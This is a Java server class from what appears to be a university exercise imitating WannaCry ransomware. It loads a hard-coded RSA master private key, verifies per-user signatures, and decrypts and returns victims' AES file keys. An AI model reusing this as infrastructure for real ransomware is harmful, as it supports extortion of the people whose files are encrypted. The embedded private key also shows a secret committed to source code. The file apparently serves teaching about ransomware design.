package le.ac.uk.WannaCry;

import javax.crypto.Cipher;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.security.KeyFactory;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.Signature;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;

public class Server {
    public static void main(String[] args) {
        String port = args[0];

        String masterPrivateKeyBase64 = "MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCpb1KSHnrdZnLI2dc7PeQrxBmm5lnesjCcWk+qjKYwiIeUsF+8MqUfPDXFYVOohIEuSCM4KsOcUPL8tmjyFMVZ1ejGhIe9mj+3M2RU05uO6Wd5BPLxNd21x0/EcNrkQqNdROOx6WM8HyuCy1T9yIU9v+wVNFZHQE9vRKPQ8M8T/Mdb6aNV8r/eANP5E0B1mlCvrDXpiJCq25GtA5AurCq23UCT87Pj1BdorviY77pAa3J8gLbxmkhe/m/Fhnp9ydvWpuZqi5/pHG9UsAehfV5aL+zZiS6vYDSOGjjUYZe3QdXERCi4LGGjjo8REJRBPUsTV1l618nhZPcvtnpDoFi5AgMBAAECggEAJG8MPeBxAh/QCfGR7yrBYEnkTDfXVmRRwKVI4T8qU2BgazA7/d+UEzHizCVAFIodryKS9DZ55qiff4kH6xpdT5KIYfvIppQ/JDlYV0dDeYkmF2dhiE3RdY+8ztyHrTLJJzqzjaPGk3yOYiswBPxz7lHRRcQB04N4MVB8u2a02LKV1m1U98NTguDJM7btwlILT77+b/aH4w4AbCpF+W42Px8VgXdZYT8R6OBHIW4TX0ollg7IU3xLpordfLzQxkpnTHZp2MsEuJomYsEWHE7E3hk5o5SetxLOiYH+4qGTgpPPctaw1m884cxqM7v6lw8c+4Km8rKaeicltzZk9xBZiQKBgQDpG4XsGjEBCISW0ckgz2HiD2rgksaCkobThSEeXdWBsdKiwPrLJ8x7Wj5MNdBkLTK4WnBFh0IorR8TuLaZNTS6tlihzq0TugX9T/sRV2u8ymv8WjPom7qNGaDVx3X7jO1yOgahZ+nS3Pi8p8p4KopRBCAIA7UMX8eiGiySRc1uVQKBgQC6EwbWI//1PIir/c5J4UfaN1Ma6ze8MYdjn8Gig6h/fKNsiihjUJlHBhbvS/drtCtVBze8zqcpBp17LNLU63rqKMRgLj3oe0uLPkGcxU6ehW+/CSbISO+M1iaGq8xV0OA++pViPC0rw1GxBR0x12WnXfGZW9vmZILJHGdAftlc1QKBgFzjVctOaIaT4VnEANRtLwEIybrxYd74CnfRDfBuzbxfoqKuKYG4uzfQLxDpRMAWbqadiy15h3hz+/U83q5QUFGyhcD8fWVl9CsLqu0vG8RgGQW24AZpv72oH7nwQGhbsOaajrfUk40t9oQejISz1ugPr7/h0kw7Am7q5SXoYML9AoGAM6yFAYMN2fTtn5Xka+/8HEWw9pDL8Z9vkeMTyyX07TKXz9SuUqZXarnuNJZMJ8TpI7vVZsGc+m+z3Dkec7LRd6XKo0s0NhPHbuvjHL5OjwdPeSX5dzWKEPqHyG59WHehTtwYECfWA4lCbn6VFPpUaJ5WMdiowNq411Dj+60+f+ECgYAfyiB9/IWx04DGWgANM3QYkxqwwRnIZ8+WQ4eo+PbXWaoujyYHMLgjvQjnSFLndetUiYKzslXhEf2TyXJxclCouH3GfuXOGbr07pu2z7WItIrY1zwlGECRPjs+MOnTY4VhUa8AR478Rc3Vnw90B2FuWq/U0m6dMteu25JGSOC1nw==";
        Base64.Decoder decoder = Base64.getDecoder();
        byte[] masterPrivateKeyBytes = decoder.decode(masterPrivateKeyBase64);
        PKCS8EncodedKeySpec PKCS8KeySpec = new PKCS8EncodedKeySpec(masterPrivateKeyBytes);
        KeyFactory keyFactory = null;
        PrivateKey keyMasterPrivate = null;
        try {
            keyFactory = KeyFactory.getInstance("RSA");
            keyMasterPrivate = keyFactory.generatePrivate(PKCS8KeySpec);
        } catch (Exception e) {
            System.out.println("Error loading master private key: " + e.getMessage());
            return;
        }

        try (ServerSocket serverSocket = new ServerSocket(Integer.parseInt(port))) {
            while (true) {
                Socket socket = serverSocket.accept();
                DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
                DataInputStream dis = new DataInputStream(socket.getInputStream());

                String userID = dis.readUTF();
                byte[] receivedSignatureBytes = dis.readNBytes(dis.readInt());
                byte[] encryptedAESKey = dis.readNBytes(dis.readInt());

                System.out.println(userID + ": User connected");

                byte[] publicKeyBytes= null;
                try (FileInputStream fis = new FileInputStream(userID + ".pub")) {
                    publicKeyBytes = fis.readAllBytes();
                } catch (Exception e) {
                    System.out.println(userID + ": Error reading public key: " + e.getMessage());
                    socket.close();
                    continue;
                }
                PublicKey publicKey = null;
                Signature signature = null;
                try {
                    publicKey = keyFactory.generatePublic(new X509EncodedKeySpec(publicKeyBytes));
                    signature = Signature.getInstance("SHA256withRSA");
                } catch (Exception e) {
                    System.out.println(userID + ": Error loading public key: " + e.getMessage());
                    socket.close();
                    continue;
                }

                boolean valid = false;
                try {
                    signature.initVerify(publicKey);
                    signature.update(userID.getBytes());
                    signature.update(encryptedAESKey);
                    valid = signature.verify(receivedSignatureBytes);
                } catch (Exception e) {
                    System.out.println(userID + ": Error initializing signature verification: " + e.getMessage());
                    socket.close();
                    continue;
                }

                if (!valid) {
                    System.out.println(userID + ": Signature verification failed.");
                    socket.close();
                    continue;
                }

                byte[] decryptedAESKeyBytes = null;
                try {
                    Cipher cipher = Cipher.getInstance("RSA");
                    cipher.init(Cipher.DECRYPT_MODE, keyMasterPrivate);
                    decryptedAESKeyBytes = cipher.doFinal(encryptedAESKey);
                } catch (Exception e) {
                    System.out.println(userID + ": Error decrypting AES key: " + e.getMessage());
                    socket.close();
                    continue;
                }
                if (decryptedAESKeyBytes != null) {
                    dos.writeInt(decryptedAESKeyBytes.length);
                    dos.write(decryptedAESKeyBytes);
                    dos.flush();
                    System.out.println(userID + ": Signature verified. Key decrypted and sent.");
                }
                socket.close();
            }

        } catch (UnknownHostException e) {
            System.out.println("Unknown host: " + e.getMessage());
        } catch (IOException e) {
            System.out.println("Error connecting to client: " + e.getMessage());
        } catch (IllegalArgumentException e) {
            System.out.println("Invalid port number: " + e.getMessage());
        }
    }
}
